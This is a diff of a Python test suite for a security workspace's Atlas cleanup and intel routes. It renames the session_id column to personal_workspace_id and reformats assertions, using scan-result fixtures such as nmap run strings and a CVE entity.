         assert len(profile_reads) <= 34
 
@@ -17222,7 +17563,7 @@ class TestAtlasRoutes:
         unrelated_run_id = "run-" + uuid.uuid4().hex
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'external', 'echo no atlas rows', ?, ?, 1)",
                 (unrelated_run_id, session_id, "2026-05-14T00:00:00+00:00", "[]"),
             )
@@ -17332,7 +17673,7 @@ class TestAtlasRoutes:
                 (other_project_id, "atlas-summary-" + uuid.uuid4().hex[:8]),
             ):
                 conn.execute(
-                    "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                    "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                     "VALUES (?, ?, 'Atlas Project', ?, ?, ?)",
                     (current_project_id, session_id, slug, timestamp, timestamp),
                 )
@@ -17367,19 +17708,19 @@ class TestAtlasRoutes:
         timestamp = "2026-05-14T00:00:03+00:00"
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO projects (id, session_id, name, slug, created, updated) "
+                "INSERT INTO projects (id, personal_workspace_id, name, slug, created, updated) "
                 "VALUES (?, ?, 'Atlas Project', ?, ?, ?)",
                 (project_id, session_id, "atlas-project-" + uuid.uuid4().hex[:8], timestamp, timestamp),
             )
             for index, entity in enumerate(recorded):
                 entity_id = entity["id"]
                 conn.execute(
-                    "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
+                    "INSERT INTO entity_labels (id, personal_workspace_id, entity_type, entity_id, label, source, created) "
                     "VALUES (?, ?, 'atlas_entity', ?, ?, 'manual', ?)",
                     ("lbl-" + uuid.uuid4().hex, session_id, entity_id, f"label-{index}", timestamp),
                 )
                 conn.execute(
-                    "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
+                    "INSERT INTO entity_notes (id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                     "VALUES (?, ?, 'atlas_entity', ?, ?, ?, ?)",
                     ("note-" + uuid.uuid4().hex, session_id, entity_id, f"note-{index}", timestamp, timestamp),
                 )
@@ -17411,26 +17752,26 @@ class TestAtlasRoutes:
         domain_id = next(item["id"] for item in recorded if item["type"] == "domain")
         with db_connect() as conn:
             finding_id = conn.execute(
-                "SELECT id FROM findings WHERE session_id = ?",
+                "SELECT id FROM findings WHERE personal_workspace_id = ?",
                 (session_id,),
             ).fetchone()["id"]
             conn.execute(
-                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
+                "INSERT INTO entity_labels (id, personal_workspace_id, entity_type, entity_id, label, source, created) "
                 "VALUES (?, ?, 'atlas_entity', ?, 'metadata-domain-label', 'manual', datetime('now'))",
                 ("lbl-" + uuid.uuid4().hex, session_id, domain_id),
             )
             conn.execute(
-                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
+                "INSERT INTO entity_notes (id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'atlas_entity', ?, 'metadata-domain-note', datetime('now'), datetime('now'))",
                 ("note-" + uuid.uuid4().hex, session_id, domain_id),
             )
             conn.execute(
-                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
+                "INSERT INTO entity_labels (id, personal_workspace_id, entity_type, entity_id, label, source, created) "
                 "VALUES (?, ?, 'finding', ?, 'metadata-finding-label', 'manual', datetime('now'))",
                 ("lbl-" + uuid.uuid4().hex, session_id, finding_id),
             )
             conn.execute(
-                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
+                "INSERT INTO entity_notes (id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'finding', ?, 'metadata-finding-note', datetime('now'), datetime('now'))",
                 ("note-" + uuid.uuid4().hex, session_id, finding_id),
             )
@@ -17475,7 +17816,7 @@ class TestAtlasRoutes:
                 finding_id = "finding-extra-" + uuid.uuid4().hex
                 seen_at = f"2026-05-14T01:{index:02d}:00+00:00"
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                    "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                     "VALUES (?, ?, 'external', ?, ?, '[]', 1)",
                     (run_id, session_id, f"nmap detail {index}", seen_at),
                 )
@@ -17487,7 +17828,7 @@ class TestAtlasRoutes:
                 )
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, entity_id, subject_key, signature_hash, severity, kind, "
+                    "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, severity, kind, "
                     "tool_root, first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, "
                     "status, title, raw_line, created) "
                     "VALUES (?, ?, ?, ?, ?, ?, 'info', 'finding', 'nmap', ?, ?, ?, ?, 1, "
@@ -17627,7 +17968,7 @@ class TestAtlasRoutes:
         cve_id = next(item["id"] for item in recorded if item["type"] == "cve")
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
+                "INSERT INTO entity_labels (id, personal_workspace_id, entity_type, entity_id, label, source, created) "
                 "VALUES (?, ?, 'atlas_entity', ?, 'kept', 'manual', datetime('now'))",
                 ("lbl-" + uuid.uuid4().hex, session_id, cve_id),
             )
@@ -17654,20 +17995,21 @@ class TestAtlasRoutes:
             "not_eligible": {"entities": 0, "findings": 0, "total": 0},
         }
         reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in preview["cleanup_reasons"]["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in preview["cleanup_reasons"]["reasons"]
         }
         assert reason_counts[("entity_label", "kept_by_default")] == (1, 0)
         assert reason_counts[("source_run_removed", "disposable")] == (0, 1)
         kept_entity_samples = preview["cleanup_reasons"]["samples"]["kept_by_default"]["entities"]
         assert kept_entity_samples == {
-            "items": [{
-                "bucket": "kept_by_default",
-                "kind": "entities",
-                "display_value": "CVE-2025-49113",
-                "item_type": "cve",
-                "reasons": [{"code": "entity_label", "label": "labeled"}],
-            }],
+            "items": [
+                {
+                    "bucket": "kept_by_default",
+                    "kind": "entities",
+                    "display_value": "CVE-2025-49113",
+                    "item_type": "cve",
+                    "reasons": [{"code": "entity_label", "label": "labeled"}],
+                }
+            ],
             "omitted": 0,
         }
         assert "disposable" not in preview["cleanup_reasons"]["samples"]
@@ -17692,11 +18034,11 @@ class TestAtlasRoutes:
             assert history_delete_audit["details"][key] == value
         with db_connect() as conn:
             rows = conn.execute(
-                "SELECT type, canonical_value FROM entities WHERE session_id = ? ORDER BY type",
+                "SELECT type, canonical_value FROM entities WHERE personal_workspace_id = ? ORDER BY type",
                 (session_id,),
             ).fetchall()
             finding_count = conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
+                "SELECT COUNT(*) FROM findings WHERE personal_workspace_id = ?",
                 (session_id,),
             ).fetchone()[0]
         assert [(row["type"], row["canonical_value"]) for row in rows] == [("cve", "CVE-2025-49113")]
@@ -17710,13 +18052,13 @@ class TestAtlasRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO entity_labels "
-                "(id, session_id, entity_type, entity_id, label, source, created) "
+                "(id, personal_workspace_id, entity_type, entity_id, label, source, created) "
                 "VALUES (?, 'other-session', 'atlas_entity', ?, 'foreign', 'manual', datetime('now'))",
                 ("lbl-" + uuid.uuid4().hex, cve_id),
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, 'other-session', 'atlas_entity', ?, 'foreign note', datetime('now'), datetime('now'))",
                 ("note-" + uuid.uuid4().hex, cve_id),
             )
@@ -17738,14 +18080,20 @@ class TestAtlasRoutes:
         assert preview["curated_entities"] == 0
         assert delete_resp.status_code == 200
         with db_connect() as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entities WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 0
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entities WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM findings WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 0
+            )
 
     def test_run_cleanup_reports_not_eligible_imported_and_seen_elsewhere_rows(self):
         client = get_client()
@@ -17762,7 +18110,7 @@ class TestAtlasRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                "(id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                 (
                     other_run_id,
@@ -17773,7 +18121,7 @@ class TestAtlasRoutes:
                 ),
             )
             finding_id = conn.execute(
-                "SELECT id FROM findings WHERE session_id = ? AND entity_id = ?",
+                "SELECT id FROM findings WHERE personal_workspace_id = ? AND entity_id = ?",
                 (session_id, domain_id),
             ).fetchone()["id"]
             conn.execute(
@@ -17815,7 +18163,7 @@ class TestAtlasRoutes:
             for entity_id, value in extra_imported_entities:
                 conn.execute(
                     "INSERT INTO entities "
-                    "(id, session_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
+                    "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                     "VALUES (?, ?, 'domain', ?, ?, ?, ?, ?)",
                     (
                         entity_id,
@@ -17865,8 +18213,7 @@ class TestAtlasRoutes:
         assert preview["findings"] == 0
         assert preview["cleanup_reasons"]["buckets"]["not_eligible"] == {"entities": 5, "findings": 1, "total": 6}
         reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in preview["cleanup_reasons"]["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in preview["cleanup_reasons"]["reasons"]
         }
         assert reason_counts[("seen_in_other_runs", "not_eligible")] == (1, 1)
         assert reason_counts[("imported_entity", "not_eligible")] == (4, 0)
@@ -17901,26 +18248,22 @@ class TestAtlasRoutes:
                 "reasons": [{"code": "imported_entity", "label": "imported entity"}],
             }
         assert not_eligible_samples["entities"] == {
-            "items": [
-                expected_entity_samples_by_id[entity_id]
-                for entity_id in sorted(expected_entity_samples_by_id)[:3]
-            ],
+            "items": [expected_entity_samples_by_id[entity_id] for entity_id in sorted(expected_entity_samples_by_id)[:3]],
             "omitted": 2,
         }
-        assert all(
-            not item["display_value"].startswith("ent_")
-            for item in not_eligible_samples["entities"]["items"]
-        )
+        assert all(not item["display_value"].startswith("ent_") for item in not_eligible_samples["entities"]["items"])
         assert not_eligible_samples["findings"] == {
-            "items": [{
-                "bucket": "not_eligible",
-                "kind": "findings",
-                "display_value": "443/tcp open https on darklab.sh",
-                "reasons": [
-                    {"code": "seen_in_other_runs", "label": "seen elsewhere"},
-                    {"code": "imported_finding", "label": "imported finding"},
-                ],
-            }],
+            "items": [
+                {
+                    "bucket": "not_eligible",
+                    "kind": "findings",
+                    "display_value": "443/tcp open https on darklab.sh",
+                    "reasons": [
+                        {"code": "seen_in_other_runs", "label": "seen elsewhere"},
+                        {"code": "imported_finding", "label": "imported finding"},
+                    ],
+                }
+            ],
             "omitted": 0,
         }
         assert "seen later" not in not_eligible_samples["findings"]["items"][0]["display_value"]
@@ -17935,13 +18278,15 @@ class TestAtlasRoutes:
         ) == {
             "not_eligible": {
                 "entities": {
-                    "items": [{
-                        "bucket": "not_eligible",
-                        "kind": "entities",
-                        "display_value": "reasonless.example",
-                        "item_type": "domain",
-                        "reasons": [],
-                    }],
+                    "items": [
+                        {
+                            "bucket": "not_eligible",
+                            "kind": "entities",
+                            "display_value": "reasonless.example",
+                            "item_type": "domain",
+                            "reasons": [],
+                        }
+                    ],
                     "omitted": 0,
                 },
             },
@@ -17953,14 +18298,20 @@ class TestAtlasRoutes:
         assert delete_resp.status_code == 200
         assert json.loads(delete_resp.data)["atlas_cleanup"] == {"entities": 0, "findings": 0}
         with db_connect() as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entities WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 5
-            assert conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 1
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entities WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 5
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM findings WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 1
+            )
 
     def test_run_cleanup_protects_findings_reachable_through_project_run_links(self):
         client = get_client()
@@ -17993,22 +18344,27 @@ class TestAtlasRoutes:
         assert preview["findings"] == 0
         assert preview["curated_findings"] == 1
         reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in preview["cleanup_reasons"]["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in preview["cleanup_reasons"]["reasons"]
         }
         assert preview["cleanup_reasons"]["buckets"]["not_eligible"] == {"entities": 1, "findings": 0, "total": 1}
         assert reason_counts[("entity_has_kept_findings", "not_eligible")] == (1, 0)
         assert reason_counts[("finding_project_run_occurrence", "kept_by_default")] == (0, 1)
         assert default_delete_resp.status_code == 200
         with db_connect() as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 1
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entities WHERE session_id = ? AND type = 'domain'",
-                (session_id,),
-            ).fetchone()[0] == 1
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM findings WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 1
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entities WHERE personal_workspace_id = ? AND type = 'domain'",
+                    (session_id,),
+                ).fetchone()[0]
+                == 1
+            )
 
     def test_run_delete_can_prune_curated_project_reachable_atlas_rows_when_requested(self):
         client = get_client()
@@ -18044,14 +18400,20 @@ class TestAtlasRoutes:
         assert preview["curated_findings"] == 1
         assert delete_resp.status_code == 200
         with db_connect() as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entities WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 0
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM findings WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entities WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 0
+            )
 
     def test_run_delete_keeps_curated_entity_with_not_eligible_child_finding_when_pruning_curated(self):
         client = get_client()
@@ -18071,7 +18433,7 @@ class TestAtlasRoutes:
         )
         with db_connect() as conn:
             finding_id = conn.execute(
-                "SELECT id FROM findings WHERE session_id = ? AND entity_id = ?",
+                "SELECT id FROM findings WHERE personal_workspace_id = ? AND entity_id = ?",
                 (session_id, domain_id),
             ).fetchone()["id"]
             conn.execute(
@@ -18111,8 +18473,7 @@ class TestAtlasRoutes:
             "not_eligible": {"entities": 1, "findings": 1, "total": 2},
         }
         reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in preview["cleanup_reasons"]["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in preview["cleanup_reasons"]["reasons"]
         }
         assert reason_counts[("entity_has_kept_findings", "not_eligible")] == (1, 0)
         assert reason_counts[("imported_finding", "not_eligible")] == (0, 1)
@@ -18120,11 +18481,11 @@ class TestAtlasRoutes:
         assert json.loads(delete_resp.data)["atlas_cleanup"] == {"entities": 1, "findings": 0}
         with db_connect() as conn:
             remaining_entities = conn.execute(
-                "SELECT type, canonical_value FROM entities WHERE session_id = ? ORDER BY type",
+                "SELECT type, canonical_value FROM entities WHERE personal_workspace_id = ? ORDER BY type",
                 (session_id,),
             ).fetchall()
             remaining_findings = conn.execute(
-                "SELECT id, entity_id FROM findings WHERE session_id = ?",
+                "SELECT id, entity_id FROM findings WHERE personal_workspace_id = ?",
                 (session_id,),
             ).fetchall()
         assert [(row["type"], row["canonical_value"]) for row in remaining_entities] == [("domain", "darklab.sh")]
@@ -18160,7 +18521,7 @@ class TestAtlasRoutes:
         project_id = "prj_team_cleanup_" + uuid.uuid4().hex
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO projects (id, session_id, team_id, name, slug, status, created, updated) "
+                "INSERT INTO projects (id, personal_workspace_id, team_id, name, slug, status, created, updated) "
                 "VALUES (?, ?, ?, 'Team Cleanup Project', ?, 'active', datetime('now'), datetime('now'))",
                 (project_id, operator_token, team_id, "team-cleanup-" + uuid.uuid4().hex[:8]),
             )
@@ -18188,49 +18549,63 @@ class TestAtlasRoutes:
         assert preview["curated_entities"] == 1
         assert preview["curated_findings"] == 1
         reason_counts = {
-            (item["code"], item["bucket"]): (item["entities"], item["findings"])
-            for item in preview["cleanup_reasons"]["reasons"]
+            (item["code"], item["bucket"]): (item["entities"], item["findings"]) for item in preview["cleanup_reasons"]["reasons"]
         }
         assert reason_counts[("entity_project_link", "kept_by_default")] == (1, 0)
         assert reason_counts[("finding_parent_entity_project_link", "kept_by_default")] == (0, 1)
         team_samples = preview["cleanup_reasons"]["samples"]["kept_by_default"]
         assert team_samples["entities"] == {
-            "items": [{
-                "bucket": "kept_by_default",
-                "kind": "entities",
-                "display_value": "darklab.sh",
-                "item_type": "domain",
-                "reasons": [{"code": "entity_project_link", "label": "linked to a Project"}],
-            }],
+            "items": [
+                {
+                    "bucket": "kept_by_default",
+                    "kind": "entities",
+                    "display_value": "darklab.sh",
+                    "item_type": "domain",
+                    "reasons": [{"code": "entity_project_link", "label": "linked to a Project"}],
+                }
+            ],
             "omitted": 0,
         }
         assert team_samples["findings"] == {
-            "items": [{
-                "bucket": "kept_by_default",
-                "kind": "findings",
+            "items": [
+                {
+                    "bucket": "kept_by_default",
+                    "kind": "findings",
                     "display_value": "443/tcp open https on darklab.sh",
-                    "reasons": [{
-                        "code": "finding_parent_entity_project_link",
-                        "label": "Project-linked entity",
-                    }],
-                }],
+                    "reasons": [
+                        {
+                            "code": "finding_parent_entity_project_link",
+                            "label": "Project-linked entity",
+                        }
+                    ],
+                }
+            ],
             "omitted": 0,
         }
         assert delete_resp.status_code == 200
         assert json.loads(delete_resp.data)["atlas_cleanup"] == {"entities": 1, "findings": 0}
         with db_connect() as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM runs WHERE id = ?",
-                (run_id,),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entities WHERE team_id = ?",
-                (team_id,),
-            ).fetchone()[0] == 1
-            assert conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE team_id = ?",
-                (team_id,),
-            ).fetchone()[0] == 1
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM runs WHERE id = ?",
+                    (run_id,),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entities WHERE team_id = ?",
+                    (team_id,),
+                ).fetchone()[0]
+                == 1
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM findings WHERE team_id = ?",
+                    (team_id,),
+                ).fetchone()[0]
+                == 1
+            )
 
     def test_team_history_cleanup_delete_matches_preview_for_cross_member_atlas_rows(self):
         client = get_client()
@@ -18265,13 +18640,13 @@ class TestAtlasRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO runs "
-                "(id, session_id, team_id, run_kind, command, started, output_preview, output_line_count) "
+                "(id, personal_workspace_id, team_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, 'external', 'nmap cross-cleanup.darklab.sh', ?, '[]', 1)",
                 (run_id, operator_token, team_id, seen_at),
             )
             conn.execute(
                 "INSERT INTO entities "
-                "(id, session_id, team_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
+                "(id, personal_workspace_id, team_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, "
                 "occurrence_count, created) "
                 "VALUES (?, ?, ?, 'domain', 'cross-cleanup.darklab.sh', ?, ?, ?, 1, ?)",
                 (entity_id, owner_token, team_id, "sig-" + entity_id, seen_at, seen_at, seen_at),
@@ -18283,7 +18658,7 @@ class TestAtlasRoutes:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, team_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
+                "(id, personal_workspace_id, team_id, run_id, entity_id, subject_key, signature_hash, severity, kind, tool_root, "
                 "first_run_id, last_run_id, first_seen_at, last_seen_at, occurrence_count, status, title, raw_line, created) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, 'info', 'finding', 'nmap', ?, ?, ?, ?, 1, 'new', ?, ?, ?)",
                 (
@@ -18356,14 +18731,20 @@ class TestAtlasRoutes:
         assert "samples" not in preview["sibling_cleanup"]["cleanup_reasons"]
         assert delete_resp.status_code == 200
         with db_connect() as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 0
-            assert conn.execute(
-                "SELECT COUNT(*) FROM entities WHERE session_id = ?",
-                (session_id,),
-            ).fetchone()[0] == 0
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM findings WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 0
+            )
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM entities WHERE personal_workspace_id = ?",
+                    (session_id,),
+                ).fetchone()[0]
+                == 0
+            )
 
     def test_run_retaining_atlas_cleanup_detaches_sources_and_recalculates_rows(self):
         client = get_client()
@@ -18398,10 +18779,13 @@ class TestAtlasRoutes:
         assert json.loads(summary_resp.data)["total"] == 0
         assert json.loads(summary_resp.data)["findings"] == 0
         with db_connect() as conn:
-            assert conn.execute(
-                "SELECT COUNT(*) FROM runs WHERE session_id = ? AND id IN (?, ?)",
-                (session_id, first_run_id, second_run_id),
-            ).fetchone()[0] == 2
+            assert (
+                conn.execute(
+                    "SELECT COUNT(*) FROM runs WHERE personal_workspace_id = ? AND id IN (?, ?)",
+                    (session_id, first_run_id, second_run_id),
+                ).fetchone()[0]
+                == 2
+            )
 
     def test_bulk_delete_atlas_entities_and_findings(self):
         client = get_client()
@@ -18437,19 +18821,18 @@ class TestAtlasRoutes:
         assert finding_data["counts"] == {"deleted": 1, "not_found": 1}
         with db_connect() as conn:
             rows = conn.execute(
-                "SELECT type, canonical_value FROM entities WHERE session_id = ? ORDER BY type",
+                "SELECT type, canonical_value FROM entities WHERE personal_workspace_id = ? ORDER BY type",
                 (session_id,),
             ).fetchall()
             finding_count = conn.execute(
-                "SELECT COUNT(*) FROM findings WHERE session_id = ?",
+                "SELECT COUNT(*) FROM findings WHERE personal_workspace_id = ?",
                 (session_id,),
             ).fetchone()[0]
         assert [(row["type"], row["canonical_value"]) for row in rows] == [("cve", "CVE-2025-49113")]
         assert cve_id
         assert finding_count == 0
         entity_delete_events = [
-            row for row in _audit_event_rows(event_type="entity.delete")
-            if domain_id in row["details"].get("entity_ids", [])
+            row for row in _audit_event_rows(event_type="entity.delete") if domain_id in row["details"].get("entity_ids", [])
         ]
         assert len(entity_delete_events) == 1
         assert entity_delete_events[0]["target_type"] == "entity"
@@ -18475,12 +18858,12 @@ class TestAtlasRoutes:
         )
         with db_connect() as conn:
             finding_id = conn.execute(
-                "SELECT id FROM findings WHERE session_id = ? AND entity_id = ?",
+                "SELECT id FROM findings WHERE personal_workspace_id = ? AND entity_id = ?",
                 (session_id, domain_id),
             ).fetchone()["id"]
             conn.execute(
                 "INSERT INTO entity_intel_snapshots "
-                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
+                "(id, personal_workspace_id, entity_id, provider, status, summary, data_json, fetched_at) "
                 "VALUES (?, ?, ?, 'crtsh', 'ok', 'data available', ?, datetime('now'))",
                 (
                     "intel_" + uuid.uuid4().hex,
@@ -18490,12 +18873,12 @@ class TestAtlasRoutes:
                 ),
             )
             conn.execute(
-                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
+                "INSERT INTO entity_labels (id, personal_workspace_id, entity_type, entity_id, label, source, created) "
                 "VALUES (?, ?, 'atlas_entity', ?, 'curated', 'manual', datetime('now'))",
                 ("lbl-" + uuid.uuid4().hex, session_id, domain_id),
             )
             conn.execute(
-                "INSERT INTO entity_notes (id, session_id, entity_type, entity_id, body, created, updated) "
+                "INSERT INTO entity_notes (id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'atlas_entity', ?, 'keep this context', datetime('now'), datetime('now'))",
                 ("note-" + uuid.uuid4().hex, session_id, domain_id),
             )
@@ -18505,39 +18888,46 @@ class TestAtlasRoutes:
             with db_connect() as conn:
                 return {
                     "entities": [
-                        tuple(row) for row in conn.execute(
+                        tuple(row)
+                        for row in conn.execute(
                             "SELECT id, type, canonical_value, occurrence_count FROM entities "
-                            "WHERE session_id = ? ORDER BY id",
+                            "WHERE personal_workspace_id = ? ORDER BY id",
                             (session_id,),
                         ).fetchall()
                     ],
                     "findings": [
-                        tuple(row) for row in conn.execute(
-                            "SELECT id, status, raw_line FROM findings WHERE session_id = ? ORDER BY id",
+                        tuple(row)
+                        for row in conn.execute(
+                            "SELECT id, status, raw_line FROM findings WHERE personal_workspace_id = ? ORDER BY id",
                             (session_id,),
                         ).fetchall()
                     ],
                     "snapshots": [
-                        tuple(row) for row in conn.execute(
+                        tuple(row)
+                        for row in conn.execute(
                             "SELECT entity_id, provider, status, summary, data_json FROM entity_intel_snapshots "
-                            "WHERE session_id = ? ORDER BY entity_id, provider",
+                            "WHERE personal_workspace_id = ? ORDER BY entity_id, provider",
                             (session_id,),
                         ).fetchall()
                     ],
                     "labels": [
-                        tuple(row) for row in conn.execute(
-                            "SELECT entity_id, label FROM entity_labels WHERE session_id = ? ORDER BY entity_id, label",
+                        tuple(row)
+                        for row in conn.execute(
+                            "SELECT entity_id, label FROM entity_labels "
+                            "WHERE personal_workspace_id = ? ORDER BY entity_id, label",
                             (session_id,),
                         ).fetchall()
                     ],
                     "notes": [
-                        tuple(row) for row in conn.execute(
-                            "SELECT entity_id, body FROM entity_notes WHERE session_id = ? ORDER BY entity_id",
+                        tuple(row)
+                        for row in conn.execute(
+                            "SELECT entity_id, body FROM entity_notes WHERE personal_workspace_id = ? ORDER BY entity_id",
                             (session_id,),
                         ).fetchall()
                     ],
                     "links": [
-                        tuple(row) for row in conn.execute(
+                        tuple(row)
+                        for row in conn.execute(
                             "SELECT project_id, entity_type, entity_id FROM project_links "
                             "WHERE project_id = ? ORDER BY entity_type, entity_id",
                             (project["id"],),
@@ -18658,7 +19048,7 @@ class TestAtlasRoutes:
         with db_connect() as conn:
             row = conn.execute(
                 "SELECT provider, status, summary, data_json FROM entity_intel_snapshots "
-                "WHERE session_id = ? AND entity_id = ?",
+                "WHERE personal_workspace_id = ? AND entity_id = ?",
                 (session_id, domain_id),
             ).fetchone()
         assert row["provider"] == "crtsh"
@@ -18673,10 +19063,7 @@ class TestAtlasRoutes:
         assert detail["intel_summary"]["provider_count"] == 1
         assert detail["intel_summary"]["last_refresh_at"]
         assert detail["intel_summary"]["providers_with_data"] == ["crtsh"]
-        assert {
-            (item["label"], item["value"], item["provider"])
-            for item in detail["intel_summary"]["highlights"]
-        } >= {
+        assert {(item["label"], item["value"], item["provider"]) for item in detail["intel_summary"]["highlights"]} >= {
             ("Certificates", "3", "crtsh"),
             ("Names", "darklab.sh, www.darklab.sh", "crtsh"),
         }
@@ -18716,10 +19103,13 @@ class TestAtlasRoutes:
             configured_count=1,
         )
 
-        with mock.patch.dict(
-            "config.CFG",
-            {"cve_risk": {"advisory_mode": "external"}},
-        ), mock.patch("services.atlas.intel_bridge.lookup_entity", return_value=lookup_result):
+        with (
+            mock.patch.dict(
+                "config.CFG",
+                {"cve_risk": {"advisory_mode": "external"}},
+            ),
+            mock.patch("services.atlas.intel_bridge.lookup_entity", return_value=lookup_result),
+        ):
             response = client.post(
                 f"/atlas/entities/{cve_entity_id}/refresh_intel",
                 headers={"X-Session-ID": session_id},
@@ -18781,17 +19171,19 @@ class TestAtlasRoutes:
             configured_count=1,
         )
 
-        with tempfile.TemporaryDirectory() as tmp, \
-             mock.patch.object(body_store, "DATA_DIR", tmp), \
-             mock.patch.dict("config.CFG", {"intel_payload_inline_max_bytes": 1}), \
-             mock.patch("services.atlas.intel_bridge.lookup_entity", return_value=lookup_result):
+        with (
+            tempfile.TemporaryDirectory() as tmp,
+            mock.patch.object(body_store, "DATA_DIR", tmp),
+            mock.patch.dict("config.CFG", {"intel_payload_inline_max_bytes": 1}),
+            mock.patch("services.atlas.intel_bridge.lookup_entity", return_value=lookup_result),
+        ):
             refresh_resp = client.post(
                 f"/atlas/entities/{domain_id}/refresh_intel",
                 headers={"X-Session-ID": session_id},
             )
             with db_connect() as conn:
                 stored = conn.execute(
